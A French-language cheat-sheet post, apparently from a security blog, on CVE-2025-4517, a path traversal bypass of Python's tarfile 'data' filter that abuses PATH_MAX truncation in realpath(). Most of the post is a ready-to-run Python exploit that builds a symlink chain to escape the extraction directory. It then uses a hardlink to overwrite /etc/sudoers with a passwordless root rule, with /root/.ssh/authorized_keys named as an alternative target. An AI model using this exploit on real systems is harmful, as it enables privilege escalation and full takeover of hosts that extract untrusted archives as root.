---
title: "CVE-2025-4517 - Python Tarfile Path Traversal"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "os.path.realpath() retourne un résultat tronqué quand la résolution de symlinks dépasse PATH_MAX (4096 bytes). Le filtre data de tarfile utilise realpath() pour vérifier les chemins → bypass."
summary: "PrivEsc | CVE-2025-4517 - Python Tarfile Path Traversal"
tags:
  - "Privilege Escalation"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PrivEsc"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Versions vulnérables
- Python ≤ 3.12.3 (et autres branches)
- Affecte tarfile.extractall() avec filter="data" ou filter="tar"

## Conditions
- Un script qui extrait un tar avec filter="data" en tant que root
- On contrôle le contenu du tar

## Principe
os.path.realpath() retourne un résultat tronqué quand la résolution de symlinks dépasse PATH_MAX (4096 bytes). Le filtre data de tarfile utilise realpath() pour vérifier les chemins → bypass.

## Exploit
```python
import tarfile, os, io

comp = 'd' * 247  # nom de dossier long
steps = "abcdefghijklmnop"  # 16 niveaux
path = ""
with tarfile.open("evil.tar", mode="w") as tar:
    # Créer chaîne de symlinks qui dépasse PATH_MAX
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    # Symlink final (non résolu par realpath - PATH_MAX dépassé)
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    # Escape vers /etc (ou /root/.ssh)
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../etc"  # adapter la profondeur
    tar.addfile(e)
    # Hardlink vers le fichier cible
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"  # ou escape/../root/.ssh/authorized_keys
    tar.addfile(f)
    # Écraser avec notre contenu
    content = b"user ALL=(ALL) NOPASSWD:ALL\n"
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
```
